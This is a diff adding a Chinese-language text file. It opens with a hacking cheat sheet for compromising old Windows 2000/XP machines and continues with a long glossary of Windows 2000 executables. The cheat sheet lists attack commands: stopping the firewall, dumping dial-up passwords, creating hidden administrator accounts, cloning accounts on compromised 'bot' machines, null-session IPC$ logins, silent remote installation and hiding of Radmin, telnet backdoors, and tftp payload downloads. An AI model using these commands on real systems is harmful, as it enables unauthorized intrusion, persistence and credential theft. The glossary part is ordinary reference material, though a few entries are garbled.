@@ -1,0 +1,728 @@
+net share d:\web=e:\web /grant:zk0898,change 
+
+控制面版：运行>>>>>>>>>>>:control
+计算机管理：command  MMC
+结束XP防火墙进程:net stop sharedaccess
+查看ADSL帐号密码的代码:dialupass /allusers /stext "c:\pass.txt
+启动3389服务：net start TermService
+关闭所有防火墙的代码:cmd.exe /c net stop sharedaccess
+iis命令重启:iisreset /reboot
+用CMD命令实现路由跟踪:tracert 域名(如：www.google.com)
+结束进程：NET SHARE
+查看版本：ver
+查看中端(服务）：net start
+查看文件：dir  
+查看3389：
+加用户：c:\winnt\system32>net user adminserver$ admin /add
+提权限：net localgroup administrators adminserver$ /add
+211.38.172.2   2180
+查看用户net user
+远程连接到主机CMD命令：telnet 主机IP
+踢人：logoff ID
+查看当前人：query user
+打开telnet:net start telnet
+telnet连接工具：OpenTelnet
+删除共享： net share e123=e:\
+删除共享： net share c$ /del
+启用GUEST：net user guest /active:yes
+为GUEST设密码：net user guest 888888
+提升到管理员：net localgroup "Administrators" guest /add
+
+超级用户隐藏器:c:\door adminserver$:admin
+
+克隆帐号：ca \\IP 你建立的帐号 密码 肉机默认帐号 密码
+ca \\127.0.0.1 adminserver$ admin adminserver admin
+
+
+完全禁止系统模认工享
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\NameSpace\DelegateFolders\{59031a47-3f72-44a7-89c5-5595fe6b30ee}]
+
+3389替换服务-----------------------
+中修改[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TermService]
+c:\winnt\system32\copy termsrv.exe service.exe
+c:\winnt\system32\cd..
+c:\winnt\sc \\127.0.0.1 config Alerter binpath= c:\winnt\system32\service.exe
+
+端口转向：f:\web\ftp.exe "c:\fpipe.exe -v -l 开放的端口 -r 要转向的端口 ip"
+
+使用空口令连接:
+net use \\对方IP\ipc$ "" /user:"administrator"
+(在上传文件的目录下)远程复制文件:
+c:\radmin>net use \\a-01\ipc$ "12345" /user:administrator
+
+c:\ramdin>copy r_server.exe \\a-01\admin$\system32
+c:\ramdin>copy radmin.reg \\a-01\admin$\sytem32
+在对方CMD下：
+c:\winnt\system32\>regedit /s radmin.reg
+c:\winnt\system32\>r_server.exe /install /silenec
+net start r_server
+
+copy r_server.exe \\对方IP\admin$\system32
+c:\opentelnet.exe \\IP ADMINISTRATOR "" 0 90
+
+
+copy 文件名 \\IP\admin$\system32
+进入对方CMD:
+c:\opentelnet.exe \\Ip administrator "" 0 90 
+登陆CMD:
+c:\telnet IP 90
+
+安装RADMIN:
+c:\winnt\system32\
+                  r_server /install silence
+c:\winnt\system32\
+                  r-server
+导入注册表:
+c:\winnt\system32\regedit.exe /s aaa.reg
+看端口:
+c:\winnt\system32\
+                  netstat -an
+改端口:
+c:\winnt\system32\
+                  r_server.exe /port:1024 /pass:1234 /save /silence
+起动服务:
+c:\winnt\system32\net start r_server
+隐藏文件:
+c:\winnt\system32\attrib.exe +h r_server.exe +h
+
+%systemroot$\system32
+
+看看共享开了没有,没有的话把共享开开 
+
+c:\winnt\system32>net share 
+清单是空的。 
+
+c:\winnt\system32>net share ipc$ 
+命令成功完成。 
+c:\winnt\system32>net share admin$ 
+命令成功完成。 
+
+注册表运行命令
+regedit
+
+查看端口：netstat-n
+
+SA传送文件TFTP
+先在本机开tftp服务 sqlexec
+
+tftp-i IP get windxp.exe c:\windows\system32\com\windxp.exe
+
+2000命令集---------------------------------
+win2000命令集accwiz.exe > accessibility wizard for walking you through setting up your machine for your mobility needs. 辅助工具向导 
+
+acsetups.exe > acs setup dcom server executable 
+
+actmovie.exe > direct show setup tool 直接显示安装工具 
+
+append.exe > allows programs to open data in specified directories as if they were in the current directory. 允许程序打开制定目录中的数据 
+
+arp.exe > network display and modify ip - hardware addresses 显示和更改计算机的ip与硬件物理地址的对应列表 
+
+at.exe > at is a scheduling utility also included with unix 计划运行任务 
+
+atmadm.exe > displays statistics for atm call manager. atm调用管理器统计 
+
+attrib.exe > display and modify attributes for files and folders 显示和更改文件和文件夹属性 
+
+autochk.exe > used to check and repair windows file systems 检测修复文件系统 
+
+autoconv.exe > automates the file system conversion during reboots 在启动过程中自动转化系统 
+
+autofmt.exe > automates the file format process during reboots 在启动过程中格式化进程 
+
+autolfn.exe > used for formatting long file names 使用长文件名格式 
+
+bootok.exe > boot acceptance application for registry 
+
+bootvrfy.exe > bootvrfy.exe, a program included in windows 2000 that notifies the system that startup was successful. bootvrfy.exe can be run on a local or remote computer. 通报启动成功 
+cacls.exe > displays or modifies access control lists (acls) of files. 显示和编辑acl 
+
+calc.exe > windows calculators 计算器 
+
+cdplayer.exe > windows cd player cd播放器 
+
+change.exe > change { user | port | logon } 与终端服务器相关的查询 
+
+charmap.exe > character map 字符映射表 
+
+chglogon.exe > same as using "change logon" 启动或停用会话记录 
+
+chgport.exe > same as using "change port" 改变端口（终端服务） 
+
+chgusr.exe > same as using "change user" 改变用户（终端服务） 
+
+chkdsk.exe > check the hard disk for errors similar to scandisk 3 stages must specify a drive letter 磁盘检测程序 
+
+chkntfs.exe > same as using chkdsk but for ntfs ntfs磁盘检测程序 
+
+cidaemon.exe > component of ci filer service 组成ci文档服务 
+
+cipher.exe > displays or alters the encryption of directories [files] on ntfs partitions. 在ntfs上显示或改变加密的文件或目录 
+
+cisvc.exe > content index -- it's the content indexing service for i 索引内容 
+
+ckcnv.exe > convertor 变换 
+
+cleanmgr.exe > disk cleanup, popular with windows 98 磁盘清理 
+
+cliconfg.exe > sql server client network utility sql客户网络工具 
+
+clipbrd.exe > clipboard viewer for local will allow you to connect to other clipboards 剪贴簿查看器 
+
+clipsrv.exe > start the clipboard server 运行clipboard服务 
+
+clspack.exe > clspack used to create a file listing of system packages 建立系统文件列表清单 
+
+cluster.exe > display a cluster in a domain 显示域的集群 
+
+_cmd_.exe > famous command prompt 没什么好说的！ 
+
+cmdl32.exe > connection manager auto-download 自动下载连接管理 
+
+cmmgr32.exe > connection manager 连接管理器 
+
+cmmon32.exe > connection manager monitor 连接管理器监视 
+
+cmstp.exe > connection manager profile manager 连接管理器配置文件安装程序 
+
+comclust.exe > about cluster server 集群 
+
+comp.exe > comclust add, remove, or join a cluster. 比较两个文件和文件集的内容＊ 
+
+compact.exe > displays or alters the compression of files on ntfs partitions. 显示或改变ntfs分区上文件的压缩状态 
+
+conime.exe > console ime ime控制台 
+
+control.exe > starts the control panel 控制面板 
+
+convert.exe > convert file system to ntfs 转换文件系统到ntfs 
+
+convlog.exe > converts ms iis log files 转换iis日志文件格式到ncsa格式 
+
+cprofile.exe > copy profiles 转换显示模式 
+
+c.exe > ms windows s host version 5.1 较本宿主版本 
+
+csrss.exe > client server runtime process 客户服务器runtime进程 
+
+csvde.exe > comma separated variable import/export utility 日至格式转换程序 
+
+dbgtrace.exe > 和terminal server相关 
+
+dcomcnfg.exe > display the current dcom configuration. dcom配置属性 
+
+dcphelp.exe > ? 
+
+dcpromo.exe > promote a domain controller to adsi ad安装向导 
+
+ddeshare.exe > display dde shares on local or remote computer dde共享 
+
+ddmprxy.exe > 
+
+debug.exe > runs debug, a program testing and editing tool. 就是debug啦！ 
+
+dfrgfat.exe > defrag fat file system fat分区磁盘碎片整理程序 
+
+dfrgntfs.exe > defrag ntfs file system ntfs分区磁盘碎片整理程序 
+
+dfs_cmd_.exe > configures a dfs tree 配置一个dfs树 
+
+dfsinit.exe > distributed file system initialization 分布式文件系统初始化 
+
+dfssvc.exe > distributed file system server 分布式文件系统服务器 
+
+diantz.exe > ms cabinet maker 制作cab文件 
+
+diskperf.exe > starts physical disk performance counters 磁盘性能计数器 
+
+dllhost.exe > dllhost is used on all versions of windows 2000. dllhost is the hedost process for all com+ applications. 所有com+应用软件的主进程 
+
+dllhst3g.exe > 
+
+dmadmin.exe > disk manager service 磁盘管理服务 
+
+dmremote.exe > part of disk management 磁盘管理服务的一部分 
+
+dns.exe > dns applications dns 
+
+doskey.exe > recalls windows command lines and creates macros 命令行创建宏 
+
+dosx.exe > dos extender dos扩展 
+
+dplaysvr.exe > direct play helper 直接运行帮助 
+
+drwatson.exe > dr watson for 2000 fault detector 华生医生错误检测 
+
+drwtsn32.exe > dr watson for 2000 viewer and configuration manager 华生医生显示和配置管理 
+
+dtcsetup.exe > installs mdtc 
+
+dvdplay.exe > windows 2000 dvd player dvd播放 
+
+dxdiag.exe > direct-x diagnostics direct-x诊断工具 
+
+edlin.exe > line-oriented text editor. 命令行的文本编辑器（历史悠久啊！） 
+edlin.exe > line-oriented text editor. 命令行的文本编辑器（历史悠久啊！） 
+
+esentutl.exe > ms database utility ms数据库工具 
+
+eudcedit.exe > private character editor ture type造字程序 
+
+eventvwr.exe > windows 2000 event viewer 事件查看器 
+
+evnt_cmd_.exe > event to trap translator; configuration tool 
+
+evntwin.exe > event to trap translator setup 
+
+exe2bin.exe > converts exe to binary format 转换exe文件到二进制 
+
+expand.exe > expand files that have been compressed 解压缩 
+
+extrac32.exe > cab file extraction utility 解cab工具 
+
+fastopen.exe > fastopen tracks the of files on a hard disk and stores the information in memory for fast access. 快速访问在内存中的硬盘文件 
+
+faxcover.exe > fax cover page editor 传真封面编辑 
+
+faxqueue.exe > display fax queue 显示传真队列 
+
+faxsend.exe > fax wizard for sending faxes 发送传真向导 
+
+faxsvc.exe > starts fax server 启动传真服务 
+
+fc.exe > compares two files or sets of files and their differences 比较两个文件的不同 
+
+find.exe > searches for a text string in file or files 查找文件中的文本行 
+
+findstr.exe > searches for strings in files 查找文件中的行 
+
+finger.exe > fingers a user and displays statistics on that user finger一个用户并显示出统计结果 
+
+fixmapi.exe > fix mapi files 修复mapi文件 
+
+flattemp.exe > enable or disable temporally directories 允许或者禁用临时文件目录 
+
+fontview.exe > display fonts in a font file 显示字体文件中的字体 
+
+forcedos.exe > forces a file to start in dos mode. 强制文件在dos模式下运行 
+
+freecell.exe > popular windows game 空当接龙 
+
+ftp.exe > file transfer protocol used to transfer files over a network connection 就是ftp了 
+
+gdi.exe > graphic device interface 图形界面驱动 
+
+grovel.exe > 
+
+grpconv.exe > program manager group convertor 转换程序管理员组 
+
+help.exe > displays help for windows 2000 commands 显示帮助 
+
+hostname.exe > display hostname for machine. 显示机器的hostname 
+
+ie4uinit.exe > ie5 user install tool ie5用户安装工具 
+
+ieshwiz.exe > customize folder wizard 自定义文件夹向导 
+
+iexpress.exe > create and setup packages for install 穿件安装包 
+
+iisreset.exe > restart iis admin service 重启iis服务 
+
+internat.exe > keyboard language indicator applet 键盘语言指示器 
+
+ipconfig.exe > windows 2000 ip configuration. 察看ip配置 
+
+ipsecmon.exe > ip security monitor ip安全监视器 
+
+ipxroute.exe > ipx routing and source routing control program ipx路由和源路由控制程序 
+
+irftp.exe > setup ftp for wireless communication 无线连接 
+
+ismserv.exe > intersite messaging service 安装或者删除service control manager中的服务 
+
+jdbgmgr.exe > microsoft debugger for 4的调试器 
+
+jetconv.exe > convert a jet engine database 转换jet engine数据库 
+
+jetpack.exe > compact jet database. 压缩jet数据库 
+
+jview.exe > command-line loader for 的命令行装载者 
+
+krnl386.exe > core component for windows 2000 2000的核心组件 
+
+label.exe > change label for drives 改变驱动器的卷标 
+
+lcwiz.exe > license compliance wizard for local or remote systems. 许可证符合向导 
+
+ldifde.exe > ldif cmd line manager ldif目录交换命令行管理 
+
+licmgr.exe > terminal server license manager 终端服务许可协议管理 
+
+lights.exe > display connection status lights 显示连接状况 
+
+llsmgr.exe > windows 2000 license manager 2000许可协议管理 
+
+llssrv.exe > start the license server 启动许可协议服务器 
+
+lnkstub.exe > 
+
+locator.exe > rpc locator 远程定位 
+
+lodctr.exe > load perfmon counters 调用性能计数 
+
+logoff.exe > log current user off. 注销用户 
+
+lpq.exe > displays status of a remote lpd queue 显示远端的lpd打印队列的状态，显示被送到基于unix的服务器的打印任务 
+
+lpr.exe > send a print job to a network printer. 重定向打印任务到网络中的打印机。通常用于unix客户打印机将打印任务发送给连接了打印设备的nt的打印机服务器。 
+
+lsass.exe > lsa executable and server dll 运行lsa和server的dll 
+
+lserver.exe > specifies the new dns domain for the default server 指定默认server新的dns域 
+
+macfile.exe > used for managing macfiles 管理macfiles 
+
+magnify.exe > used to magnify the current screen 放大镜 
+
+makecab.exe > ms cabinet maker 制作cab文件 
+
+mdm.exe > machine debug manager 机器调试管理 
+
+mem.exe > display current memory stats 显示内存状态 
+
+migpwd.exe > migrate passwords. 迁移密码 
+
+mmc.exe > microsoft management console 控制台 
+
+mnmsrvc.exe > netmeeting remote desktop sharing netmeeting远程桌面共享 
+
+mobsync.exe > manage synchronization. 同步目录管理器 
+
+mountvol.exe > creates, s, or lists a volume mount point. 创建、删除或列出卷的装入点。 
+
+mplay32.exe > ms media player 媒体播放器 
+mpnotify.exe > multiple provider notification application 多提供者通知应用程序 
+
+mq1sync.exe > 
+
+mqbkup.exe > ms message queue backup and restore utility 信息队列备份和恢复工具 
+
+mqexchng.exe > msmq exchange connector setup 信息队列交换连接设置 
+
+mqmig.exe > msmq migration utility 信息队列迁移工具 
+
+mqsvc.exe > ? 
+
+mrinfo.exe > multicast routing using snmp 使用snmp多点传送路由 
+
+mscdexnt.exe > installs mscd (ms cd extensions) 安装mscd 
+
+msdtc.exe > dynamic transaction controller console 动态事务处理控制台 
+
+msg.exe > send a message to a user local or remote. 发送消息到本地或远程客户 
+
+mshta.exe > html application host html应用程序主机 
+
+msiexec.exe > starts windows installer program 开始windows安装程序 
+
+mspaint.exe > microsoft paint 画板 
+
+msswchx.exe > 
+
+mstask.exe > task schedule program 任务计划表程序 
+
+mstinit.exe > task scheduler setup 任务计划表安装 
+
+narrator.exe > program will allow you to have a narrator for reading. microsoft讲述人 
+
+nbtstat.exe > displays protocol stats and current tcp/ip connections using nbt 使用 nbt（tcp/ip 上的 netbios）显示协议统计和当前 tcp/ip 连接。 
+
+nddeapir.exe > ndde api server side ndde api服务器端 
+
+net.exe > net utility 详细用法看/？ 
+
+net1.exe > net utility d version from ms net的升级版 
+
+netdde.exe > network dde will install itself into the background 安装自己到后台 
+
+netsh.exe > creates a shell for network information 用于配置和监控 windows 2000 命令行脚本接口。 
+
+netstat.exe > displays current connections. 显示协议统计和当前的 tcp/ip 网络连接。 
+
+nlsfunc.exe > loads country-specific information 加载特定国家（地区）的信息。windows 2000 和 ms-dos 子系统不使用该命令。接受该命令只是为了与 ms-dos 文件兼容。 
+
+notepad.exe > opens windows 2000 notepad 记事本 
+
+nslookup.exe > displays information for dns 该诊断工具显示来自域名系统 (dns) 名称服务器的信息。 
+
+ntbackup.exe > opens the nt backup utility 备份和故障修复工具 
+
+ntbooks.exe > starts windows help utility 帮助 
+
+ntdsutil.exe > performs db maintenance of the adsi 完成adsi的db的维护 
+
+ntfrs.exe > nt file replication service nt文件复制服务 
+
+ntfrsupg.exe > 
+
+ntkrnlpa.exe > kernel patch 核心补丁 
+
+ntoskrnl.exe > core nt kernel kt的核心 
+
+ntsd.exe > 
+
+ntvdm.exe > simulates a 16-bit windows environment 模拟16位windows环境 
+
+nw16.exe > netware redirector netware转向器 
+
+nw.exe > runs netware s 运行netware脚本 
+
+odbcad32.exe > odbc 32-bit administrator 32位odbc管理 
+
+odbcconf.exe > configure odbc driver's and data source's from command line 命令行配置odbc驱动和数据源 
+
+os2.exe > an os/2 warp server (os2 /o) os/2 
+
+os2srv.exe > an os/2 warp server os/2 
+
+os2ss.exe > an os/2 warp server os/2 
+
+osk.exe > on screen keyboard 屏幕键盘 
+
+packager.exe > windows 2000 packager manager 对象包装程序 
+
+pathping.exe > combination of ping and tracert 包含ping和tracert的程序 
+
+pax.exe > is a posix program and path names used as arguments must be specified in posix format. use "//c/users/default" instead of "c:usersdefault." 启动便携式存档互换 (pax) 实用程序 
+
+pentnt.exe > used to check the pentium for the floating point division error. 检查pentium的浮点错误 
+
+perfmon.exe > starts windows performance monitor 性能监视器 
+
+ping.exe > packet internet groper 验证与远程计算机的连接 
+
+posix.exe > used for backward compatibility with unix 用于兼容unix 
+
+print.exe > cmd line used to print files 打印文本文件或显示打印队列的内容。 
+
+progman.exe > program manager 程序管理器 
+
+proquota.exe > profile quota program 
+
+psxss.exe > posix subsystem application posix子系统应用程序 
+
+qappsrv.exe > displays the available application terminal servers on the network 
+在网络上显示终端服务器可用的程序 
+
+qprocess.exe > display information about processes local or remote 在本地或远程显示进程的信息（需终端服务） 
+
+query.exe > query termserver user process and sessions 查询进程和对话 
+
+quser.exe > display information about a user logged on 显示用户登陆的信息（需终端服务） 
+
+qwinsta.exe > display information about terminal sessions. 显示终端服务的信息 
+
+rasadmin.exe > start the remote access admin service 启动远程访问服务 
+
+rasautou.exe > creates a ras connection 建立一个ras连接 
+
+rasdial.exe > dial a connection 拨号连接 
+
+rasphone.exe > starts a ras connection 运行ras连接 
+
+rcp.exe > copies a file from and to a rcp service. 在 windows 2000 计算机和运行远程外壳端口监控程序 rshd 的系统之间复制文件 
+
+rdpclip.exe > rdpclip allows you to copy and paste files between a terminal session and client console session. 再终端和本地复制和粘贴文件 
+
+recover.exe > recovers readable information from a bad or defective disk 从坏的或有缺陷的磁盘中恢复可读取的信息。 
+
+redir.exe > starts the redirector service 运行重定向服务 
+
+regedt32.exe > 32-bit register service 32位注册服务 
+
+regini.exe > modify registry permissions from within a 用脚本修改注册许可 
+
+register.exe > register a program so it can have special execution characteristics. 注册包含特殊运行字符的程序 
+
+regsvc.exe > 
+
+regsvr32.exe > registers and unregister's dll's. as to how and where it register's them i dont know. 注册和反注册dll 
+
+regtrace.exe > options to tune debug options for applications failing to dump trace statements 
+trace 设置 
+regwiz.exe > registration wizard 注册向导 
+
+remrras.exe > 
+
+replace.exe > replace files 用源目录中的同名文件替换目标目录中的文件。 
+
+reset.exe > reset an active section 重置活动部分 
+
+rexec.exe > runs commands on remote hosts running the rexec service. 在运行 rexec 服务的远程计算机上运行命令。rexec 命令在执行指定命令前，验证远程计算机上的用户名，只有安装了 tcp/ip 协议后才可以使用该命令。 
+
+risetup.exe > starts the remote installation service wizard. 运行远程安装向导服务 
+
+route.exe > display or edit the current routing tables. 控制网络路由表 
+
+routemon.exe > no longer supported 不再支持了！ 
+
+router.exe > router software that runs either on a dedicated dos or on an os/2 system. route软件在 dos或者是os/2系统 
+
+rsh.exe > runs commands on remote hosts running the rsh service 在运行 rsh 服务的远程计算机上运行命令 
+
+rsm.exe > mounts and configures remote system media 配置远程系统媒体 
+
+rsnotify.exe > remote storage notification recall 远程存储通知回显 
+
+rsvp.exe > resource reservation protocol 源预约协议 
+
+runas.exe > run a program as another user 允许用户用其他权限运行指定的工具和程序 
+
+rundll32.exe > launches a 32-bit dll program 启动32位dll程序 
+
+runonce.exe > causes a program to run during startup 运行程序再开始菜单中 
+
+rwinsta.exe > reset the session subsystem hardware and software to known initial values 重置会话子系统硬件和软件到最初的值 
+
+savedump.exe > does not write to e:winntuser.dmp 不写入user.dmp中 
+
+scardsvr.exe > smart card resource management server 子能卡资源管理服务器 
+
+schupgr.exe > it will read the schema files (.ldf files) and upgrade the schema. (part of adsi) 读取计划更新文件和更新计划 
+
+secedit.exe > starts security editor help 自动安全性配置管理 
+
+services.exe > controls all the services 控制所有服务 
+
+sethc.exe > set high contrast - changes colours and display mode logoff to set it back to normal 设置高对比 
+
+setreg.exe > shows the software publishing state key values 显示软件发布的国家语言 
+
+setup.exe > gui box prompts you to goto control panel to configure system components 安装程序（转到控制面板） 
+
+setver.exe > set version for files 设置 ms-dos 子系统向程序报告的 ms-dos 版本号 
+
+sfc.exe > system file checker test and check system files for integrity 系统文件检查 
+
+sfmprint.exe > print services for macintosh 打印macintosh服务 
+
+sfmpsexe.exe > 
+
+sfmsvc.exe > 
+
+shadow.exe > monitor another terminal services session. 监控另外一台中端服务器会话 
+
+share.exe > windows 2000 和 ms-dos 子系统不使用该命令。接受该命令只是为了与 ms-dos 文件兼容 
+
+shmgrate.exe > 
+
+shrpubw.exe > create and share folders 建立和共享文件夹 
+
+sigverif.exe > file signature verification 文件签名验证 
+
+skeys.exe > serial keys utility 序列号制作工具 
+
+smlogsvc.exe > performance logs and alerts 性能日志和警报 
+
+smss.exe > 
+
+sndrec32.exe > starts the windows sound recorder 录音机 
+
+sndvol32.exe > display the current volume information 显示声音控制信息 
+
+snmp.exe > simple network management protocol used for network mangement 简单网络管理协议 
+
+snmptrap.exe > utility used with snmp snmp工具 
+
+sol.exe > windows solitaire game 纸牌 
+
+sort.exe > compares files and folders 读取输入、排序数据并将结果写到屏幕、文件和其他设备上 
+
+spoolsv.exe > part of the spooler service for printing 打印池服务的一部分 
+
+sprestrt.exe > 
+
+srvmgr.exe > starts the windows server manager 服务器管理器 
+
+stimon.exe > wdm stillimage- > monitor 
+
+stisvc.exe > wdm stillimage- > service 
+
+subst.exe > associates a path with a drive letter 将路径与驱动器盘符关联 
+
+svchost.exe > svchost.exe is a generic host process name for services that are run from dynamic-link libraries (dlls). dll得主进程 
+
+syncapp.exe > creates windows briefcase. 创建windows文件包 
+
+sysedit.exe > opens editor for 4 system files 系统配置编辑器 
+
+syskey.exe > encrypt and secure system database nt账号数据库按群工具 
+
+sysocmgr.exe > windows 2000 setup 2000安装程序 
+
+systray.exe > starts the systray in the lower right corner. 在低权限运行systray 
+
+taskman.exe > task manager 任务管理器 
+
+taskmgr.exe > starts the windows 2000 task manager 任务管理器 
+
+tcmsetup.exe > telephony client wizard 电话服务客户安装 
+
+tcpsvcs.exe > tcp services tcp服务 
+
+.exe > telnet utility used to connect to telnet server 
+
+termsrv.exe > terminal server 终端服务 
+
+tftp.exe > trivial ftp 将文件传输到正在运行 tftp 服务的远程计算机或从正在运行 tftp 服务的远程计算机传输文件 
+
+tftpd.exe > trivial ftp daemon 
+
+themes.exe > change windows themes 桌面主题 
+
+tlntadmn.exe > telnet server administrator telnet服务管理 
+
+tlntsess.exe > display the current telnet sessions 显示目前的telnet会话 
+
+tlntsvr.exe > start the telnet server 开始telnet服务 
+
+tracert.exe > trace a route to display paths 该诊断实用程序将包含不同生存时间 (ttl) 值的 internet 控制消息协议 (icmp) 回显数据包发送到目标，以决定到达目标采用的路由 
+
+tsadmin.exe > terminal server administrator 终端服务管理器 
+
+tscon.exe > attaches a user session to a terminal session. 粘贴用户会话到终端对话 
+
+tsdiscon.exe > disconnect a user from a terminal session 断开终端服务的用户 
+
+tskill.exe > kill a terminal server process 杀掉终端服务 
+
+tsprof.exe > used with terminal server to query results. 用终端服务得出查询结果 
+
+tsshutdn.exe > shutdown the system 关闭系统 
+
+unlodctr.exe > part of performance monitoring 性能监视器的一部分 
+
+upg351db.exe > upgrade a jet database 升级jet数据库 
+
+ups.exe > ups service ups服务 
+
+user.exe > core windows service windows核心服务 
+
+userinit.exe > part of the winlogon process winlogon进程的一部分 
+
+usrmgr.exe > start the windows user manager for domains 域用户管理器 
+
+utilman.exe > this tool enables an administrator to designate which computers automatically open accessibility tools when windows 2000 starts. 指定2000启动时自动打开那台机器 
+
+verifier.exe > driver verifier manager driver verifier manager 
+
+vwipxspx.exe > loads ipx/spx vdm 调用ipx/spx vdm 
+
+w32tm.exe > windows time server 时间服务器 
+
+wextract.exe > used to extract windows files 解压缩windows文件 
+
+winchat.exe > opens windows chat 打开windows聊天 
+
+
+
